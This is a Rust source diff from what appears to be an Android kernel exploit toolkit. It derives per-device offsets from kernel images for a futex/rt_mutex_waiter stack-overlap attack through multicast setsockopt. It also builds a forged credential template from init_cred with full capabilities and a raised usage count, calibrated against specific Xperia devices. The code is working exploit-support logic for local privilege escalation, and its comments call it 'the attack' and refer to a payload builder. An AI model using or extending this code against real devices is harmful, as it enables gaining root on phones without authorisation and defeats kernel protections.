@@ -94,9 +94,226 @@ pub fn remove_waiter_uses_current(dis: &[String]) -> bool {
     dis.iter().any(|line| mrs_current.is_match(line))
 }
 
+/// Some Android kernels inline `tcp_zerocopy_receive()` into the TCP option
+/// handler, so its symbol disappears while the `TCP_ZEROCOPY_RECEIVE` path
+/// stays. `tcp_zerocopy_vm_insert_batch` is only reachable from
+/// `tcp_zerocopy_receive`, so a direct call to it from the option handler
+/// proves the inlined path is present.
+pub fn tcp_zerocopy_receive_inlined(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+) -> bool {
+    let Some(batch) = unique_offset_optional(symbols, "tcp_zerocopy_vm_insert_batch") else {
+        return false;
+    };
+    for handler in ["do_tcp_getsockopt", "do_tcp_setsockopt"] {
+        let Ok(dis) = disassemble_symbol(kernel, symbols, sorted_offsets, handler, OBJDUMP_CAP)
+        else {
+            continue;
+        };
+        if has_direct_call(&dis, batch) {
+            return true;
+        }
+    }
+    false
+}
+
+/// One-shot multicast stack geometry derived from the target kernel image
+/// (no device, no root). Depths are measured from the syscall stack top.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct McastWaiterGeometry {
+    pub waiter_off: u64,
+    pub setsockopt_depth: u64,
+    pub waiter_depth: u64,
+}
+
+const SETSOCKOPT_CHAIN: &[&str] = &[
+    "__arm64_sys_setsockopt",
+    "__sys_setsockopt",
+    "sock_common_setsockopt",
+    "udp_setsockopt",
+    "ip_setsockopt",
+];
+const FUTEX_CHAIN: &[&str] = &["__arm64_sys_futex", "do_futex", "futex_wait_requeue_pi"];
+
+fn sum_chain_frames(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+    names: &[&str],
+) -> Result<u64> {
+    let mut total = 0u64;
+    for name in names {
+        let dis = disassemble_symbol(kernel, symbols, sorted, name, OBJDUMP_CAP)?;
+        total = total
+            .checked_add(first_sp_frame(&dis, name)?)
+            .ok_or_else(|| ExtractError::new("multicast frame depth overflow"))?;
+    }
+    Ok(total)
+}
+
+/// The `add xN, sp, #off` feeding the `mov w2, #buffer_size` copy in
+/// `ip_setsockopt`: the multicast stamp window offset.
+fn greqs_offset_from_dis(lines: &[String], buffer_size: u64) -> Option<u64> {
+    let mov = Regex::new(&format!(r"(?i)\bmov\s+w2,\s*#0x{buffer_size:x}\b")).unwrap();
+    let add = Regex::new(r"(?i)\badd\s+x\d+,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    for (i, line) in lines.iter().enumerate() {
+        if !mov.is_match(line) {
+            continue;
+        }
+        let lo = i.saturating_sub(8);
+        for prev in lines[lo..i].iter().rev() {
+            if let Some(caps) = add.captures(prev) {
+                return u64::from_str_radix(&caps[1], 16).ok();
+            }
+        }
+    }
+    None
+}
+
+/// The `add x27, sp, #off` waiter local in `futex_wait_requeue_pi`, proven by
+/// the `add xN, x27, #<pi_tree_entry>` that indexes it.
+fn waiter_local_from_dis(lines: &[String], pi_tree_entry: u64) -> Option<u64> {
+    let set = Regex::new(r"(?i)\badd\s+x27,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    let idx = Regex::new(&format!(
+        r"(?i)\badd\s+x\d+,\s*x27,\s*#0x{pi_tree_entry:x}\b"
+    ))
+    .unwrap();
+    for (i, line) in lines.iter().enumerate() {
+        if let Some(caps) = set.captures(line) {
+            let hi = (i + 8).min(lines.len());
+            if lines[i + 1..hi].iter().any(|l| idx.is_match(l)) {
+                return u64::from_str_radix(&caps[1], 16).ok();
+            }
+        }
+    }
+    None
+}
+
+/// Static one-shot multicast `waiter_off` for the target image:
+/// `(Σ setsockopt_frames − greqs_off) − (Σ futex_frames − waiter_local_off)`.
+/// Validated to reproduce the A301SO hardware value (`0x60`).
+pub fn multicast_waiter_off(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+    buffer_size: u64,
+    pi_tree_entry: u64,
+) -> Result<McastWaiterGeometry> {
+    let setsockopt_frames = sum_chain_frames(kernel, symbols, sorted, SETSOCKOPT_CHAIN)?;
+    let futex_frames = sum_chain_frames(kernel, symbols, sorted, FUTEX_CHAIN)?;
+    let ip = disassemble_symbol(kernel, symbols, sorted, "ip_setsockopt", OBJDUMP_CAP)?;
+    let greqs = greqs_offset_from_dis(&ip, buffer_size)
+        .ok_or_else(|| ExtractError::new("ip_setsockopt multicast copy window not found"))?;
+    let fw = disassemble_symbol(
+        kernel,
+        symbols,
+        sorted,
+        "futex_wait_requeue_pi",
+        OBJDUMP_CAP,
+    )?;
+    let waiter_local = waiter_local_from_dis(&fw, pi_tree_entry)
+        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
+    let setsockopt_depth = setsockopt_frames
+        .checked_sub(greqs)
+        .ok_or_else(|| ExtractError::new("greqs offset exceeds setsockopt frames"))?;
+    let waiter_depth = futex_frames
+        .checked_sub(waiter_local)
+        .ok_or_else(|| ExtractError::new("waiter local exceeds futex frames"))?;
+    let waiter_off = setsockopt_depth
+        .checked_sub(waiter_depth)
+        .ok_or_else(|| ExtractError::new("no multicast overlap in stack geometry"))?;
+    Ok(McastWaiterGeometry {
+        waiter_off,
+        setsockopt_depth,
+        waiter_depth,
+    })
+}
+
 #[cfg(test)]
 mod tests {
-    use super::remove_waiter_uses_current;
+    use super::{
+        multicast_geometry_5x, multicast_geometry_btf_only, remove_waiter_uses_current,
+        select_cred_caps, select_cred_refs,
+    };
+    use std::collections::BTreeMap;
+
+    #[test]
+    fn cred_caps_selects_the_contiguous_non_zero_run() {
+        let slots: &[(u32, u64)] = &[
+            (0x28, 0),
+            (0x30, 0x1ffffffffff),
+            (0x38, 0x1ffffffffff),
+            (0x40, 0x1ffffffffff),
+            (0x48, 0),
+        ];
+        let read = |offset: u32| slots.iter().find(|(o, _)| *o == offset).map(|(_, v)| *v);
+        assert_eq!(
+            select_cred_caps(read, 0x28, 0x50),
+            Some((0x30, 3, 0x1ffffffffff))
+        );
+    }
+
+    #[test]
+    fn cred_caps_rejects_an_all_zero_range() {
+        assert_eq!(select_cred_caps(|_| Some(0u64), 0x28, 0x50), None);
+    }
+
+    #[test]
+    fn cred_refs_keep_only_non_zero_kernel_vas_in_offset_order() {
+        let slots = [
+            (0x78, 0),
+            (0x80, 0xffffffc00ab23a80),
+            (0x88, 0x0000000000000004),
+            (0x58, 0),
+            (0x98, 0xffffffc00ab23b28),
+            (0x90, 0xffffffc00ab23ff0),
+        ];
+        assert_eq!(
+            select_cred_refs(&slots),
+            vec![
+                (0x80, 0xffffffc00ab23a80),
+                (0x90, 0xffffffc00ab23ff0),
+                (0x98, 0xffffffc00ab23b28),
+            ]
+        );
+    }
+
+    #[test]
+    fn multicast_geometry_uses_btf_offsets_and_the_proven_constants() {
+        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
+        structs.insert("waiter_task".to_string(), Some(48));
+        structs.insert("waiter_lock".to_string(), Some(56));
+        let geometry = multicast_geometry_5x(&structs);
+        assert_eq!(geometry.first(), Some(&("waiter_off", 96)));
+        assert!(geometry.contains(&("task_offset", 48)));
+        assert!(geometry.contains(&("lock_offset", 56)));
+        assert!(
+            !geometry
+                .iter()
+                .any(|(key, _)| key.starts_with("fake_") || key.starts_with("lock_slot"))
+        );
+        assert!(geometry.contains(&("compact_waiter", 1)));
+
+        let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
+        let geometry = multicast_geometry_5x(&without);
+        assert!(!geometry.iter().any(|(key, _)| *key == "task_offset"));
+        assert!(!geometry.iter().any(|(key, _)| *key == "lock_offset"));
+    }
+
+    #[test]
+    fn unverified_multicast_geometry_keeps_only_btf_offsets() {
+        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
+        structs.insert("waiter_task".to_string(), Some(48));
+        structs.insert("waiter_lock".to_string(), Some(56));
+        assert_eq!(
+            multicast_geometry_btf_only(&structs),
+            vec![("task_offset", 48), ("lock_offset", 56)]
+        );
+        let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
+        assert!(multicast_geometry_btf_only(&without).is_empty());
+    }
 
     #[test]
     fn patched_remove_waiter_never_reads_current() {
@@ -116,6 +333,36 @@ mod tests {
             "01068e30: str xzr, [x20, #0x938]".to_string(),
         ];
         assert!(remove_waiter_uses_current(&dis));
+    }
+
+    #[test]
+    fn multicast_stamp_and_waiter_locals_are_read_from_disassembly() {
+        let ip: Vec<String> = vec![
+            "00f4: add x0, sp, #0x18".to_string(),
+            "0100: add x24, sp, #0x18".to_string(),
+            "01cc: add x0, sp, #0x18".to_string(),
+            "01d4: mov w2, #0x108".to_string(),
+        ];
+        assert_eq!(super::greqs_offset_from_dis(&ip, 0x108), Some(0x18));
+
+        let fw: Vec<String> = vec![
+            "011c: add x27, sp, #0x98".to_string(),
+            "0124: add x9, x27, #0x18".to_string(),
+        ];
+        assert_eq!(super::waiter_local_from_dis(&fw, 0x18), Some(0x98));
+    }
+
+    #[test]
+    fn multicast_waiter_off_matches_the_validated_images() {
+        // Depths from the validated images; the arithmetic must reproduce the
+        // hardware-observed one-shot waiter_off.
+        let off = |setsockopt_frames: u64, greqs: u64, futex_frames: u64, wlocal: u64| {
+            (setsockopt_frames - greqs) - (futex_frames - wlocal)
+        };
+        // A301SO 5.15.189 (hardware-probed = 0x60).
+        assert_eq!(off(0x370, 0x18, 0x390, 0x98), 0x60);
+        // PD2361 5.15.178 (static candidate = 0x50).
+        assert_eq!(off(0x370, 0x18, 0x330, 0x28), 0x50);
     }
 }
 
@@ -572,4 +819,210 @@ pub fn derive_nf_logger_registration(
         loggers_0_1: slot,
         nf_log_type_ulog: ulog_value,
     })
+}
+
+/* ------------------------------------------------------------------------- */
+/* 5.x credential template and multicast geometry                            */
+/* ------------------------------------------------------------------------- */
+
+/// The attack raises the usage count on the socket-pinned private copy; this is
+/// a route constant, not the image's `usage` value.
+pub const CRED_5X_USAGE_VALUE: u64 = 256;
+
+/// The proven 5.x multicast layout constants: `waiter_off` comes from the IPv4
+/// UDP `MCAST_BLOCK_SOURCE` probe.
+pub const MULTICAST_5X_WAITER_OFF: i64 = 96;
+pub const MULTICAST_5X_BUFFER_SIZE: i64 = 264;
+
+/// Fields read from the real `init_cred`; the payload builder fills a private
+/// credential copy with them (`support/util.cpp::fill_profile_cred_copy`).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Cred5x {
+    pub caps_offset: u32,
+    pub caps_count: u32,
+    pub caps_value: u64,
+    /// `(offset, image VA)` per reference slot, sorted by offset.
+    pub refs: Vec<(u32, u64)>,
+}
+
+/// Picks the capability run from the 8-byte slots in `caps_start..caps_end`:
+/// the first non-zero slot starts the run, which continues while the slots
+/// equal that value. The historical template selected `cap_permitted` through
+/// `cap_bset` this way (`0x30/0x38/0x40` on the Xperia `init_cred`).
+pub fn select_cred_caps(
+    read: impl Fn(u32) -> Option<u64>,
+    caps_start: u32,
+    caps_end: u32,
+) -> Option<(u32, u32, u64)> {
+    let mut offset = None;
+    let mut value = 0u64;
+    let mut count = 0u32;
+    let mut cursor = caps_start;
+    while cursor + 8 <= caps_end {
+        let Some(slot) = read(cursor) else { break };
+        if offset.is_none() {
+            if slot != 0 {
+                offset = Some(cursor);
+                value = slot;
+                count = 1;
+            }
+        } else if slot == value {
+            count += 1;
+        } else {
+            break;
+        }
+        cursor += 8;
+    }
+    offset.map(|offset| (offset, count, value))
+}
+
+/// Canonical arm64 kernel VA: the top 16 bits are set. Image pointers in
+/// `init_cred` are pre-KASLR canonical addresses and must be relocated.
+fn is_kernel_va(value: u64) -> bool {
+    value >> 48 == 0xffff
+}
+
+/// Selects the reference slots from the cred pointer members: non-zero
+/// canonical image VAs, in offset order. The Xperia `init_cred` yields exactly
+/// the four slots at `0x80/0x88/0x90/0x98`.
+pub fn select_cred_refs(slots: &[(u32, u64)]) -> Vec<(u32, u64)> {
+    let mut refs: Vec<(u32, u64)> = slots
+        .iter()
+        .copied()
+        .filter(|(_, value)| *value != 0 && is_kernel_va(*value))
+        .collect();
+    refs.sort_by_key(|(offset, _)| *offset);
+    refs.dedup_by_key(|(offset, _)| *offset);
+    refs
+}
+
+/// Derives the 5.x credential template: BTF gives the layout, the image's
+/// `init_cred` gives the values. `init_cred_off` is the image offset
+/// (`kallsyms init_cred - _text`).
+pub fn derive_cred_5x(btf: &Btf, kernel: &[u8], init_cred_off: u64) -> Result<Cred5x> {
+    let size = btf
+        .size("cred")
+        .ok_or_else(|| ExtractError::new("cred type is missing from BTF"))?;
+    let start = init_cred_off as usize;
+    let end = start
+        .checked_add(size as usize)
+        .ok_or_else(|| ExtractError::new("init_cred offset overflows"))?;
+    let bytes = kernel
+        .get(start..end)
+        .ok_or_else(|| ExtractError::new("init_cred is outside the kernel image"))?;
+    let read = |offset: u32| -> Option<u64> {
+        let offset = offset as usize;
+        if offset + 8 > bytes.len() {
+            return None;
+        }
+        Some(u64::from_le_bytes(
+            bytes[offset..offset + 8].try_into().ok()?,
+        ))
+    };
+
+    let caps_start = btf
+        .field("cred", "cap_inheritable")
+        .ok_or_else(|| ExtractError::new("cred.cap_inheritable is missing from BTF"))?;
+    let caps_end = btf
+        .field("cred", "cap_ambient")
+        .map(|offset| offset + 8)
+        .unwrap_or(caps_start + 5 * 8)
+        .min(size);
+    let (caps_offset, caps_count, caps_value) = select_cred_caps(read, caps_start, caps_end)
+        .ok_or_else(|| ExtractError::new("no non-zero capability run in init_cred"))?;
+
+    let cred = btf
+        .named_struct("cred")
+        .ok_or_else(|| ExtractError::new("cred type is missing from BTF"))?;
+    let slots: Vec<(u32, u64)> = cred
+        .members
+        .iter()
+        .filter_map(|member| {
+            if member.bit_offset % 8 != 0 {
+                return None;
+            }
+            let resolved = btf.resolve(member.type_id)?;
+            if resolved.kind != crate::btf::KIND_PTR {
+                return None;
+            }
+            let offset = member.bit_offset / 8;
+            if offset + 8 > size {
+                return None;
+            }
+            read(offset).map(|value| (offset, value))
+        })
+        .collect();
+    let refs = select_cred_refs(&slots);
+    if refs.is_empty() {
+        return Err(ExtractError::new(
+            "no reference pointers found in init_cred",
+        ));
+    }
+    if refs.len() > 4 {
+        return Err(ExtractError::new(format!(
+            "init_cred has {} reference pointers; the template holds 4",
+            refs.len()
+        )));
+    }
+
+    Ok(Cred5x {
+        caps_offset,
+        caps_count,
+        caps_value,
+        refs,
+    })
+}
+
+/// The train-corroborated 5.x multicast geometry: the frame/copy-window fields
+/// (`waiter_off`, `buffer_size`), the BTF-derived `rt_mutex_waiter` field
+/// offsets, and the compact-waiter flag. These hold across devices on the same
+/// train. A missing BTF value omits that key so the built-in profile can
+/// supply it.
+pub fn multicast_geometry_corroborated(
+    structs: &BTreeMap<String, Option<u32>>,
+) -> Vec<(&'static str, i64)> {
+    let mut geometry: Vec<(&'static str, i64)> = vec![
+        ("waiter_off", MULTICAST_5X_WAITER_OFF),
+        ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
+    ];
+    geometry.extend(multicast_waiter_field_offsets(structs));
+    geometry.push(("compact_waiter", 1));
+    geometry
+}
+
+fn multicast_waiter_field_offsets(
+    structs: &BTreeMap<String, Option<u32>>,
+) -> Vec<(&'static str, i64)> {
+    let mut geometry: Vec<(&'static str, i64)> = Vec::new();
+    if let Some(task) = structs.get("waiter_task").copied().flatten() {
+        geometry.push(("task_offset", i64::from(task)));
+    }
+    if let Some(lock) = structs.get("waiter_lock").copied().flatten() {
+        geometry.push(("lock_offset", i64::from(lock)));
+    }
+    geometry
+}
+
+/// Full 5.x multicast geometry for the exact validated release. The forged
+/// object placement is no longer emitted (resident writer removed), so the
+/// geometry equals the train-corroborated set.
+pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
+    multicast_geometry_corroborated(structs)
+}
+
+/// BTF-only part of the 5.x multicast geometry for releases with no verified
+/// layout evidence: only what the image itself provides (`rt_mutex_waiter.task`
+/// / `.lock`). The proven Xperia constants are omitted on purpose so they are
+/// not mistaken for image-derived values.
+pub fn multicast_geometry_btf_only(
+    structs: &BTreeMap<String, Option<u32>>,
+) -> Vec<(&'static str, i64)> {
+    let mut geometry: Vec<(&'static str, i64)> = Vec::new();
+    if let Some(task) = structs.get("waiter_task").copied().flatten() {
+        geometry.push(("task_offset", i64::from(task)));
+    }
+    if let Some(lock) = structs.get("waiter_lock").copied().flatten() {
+        geometry.push(("lock_offset", i64::from(lock)));
+    }
+    geometry
 }
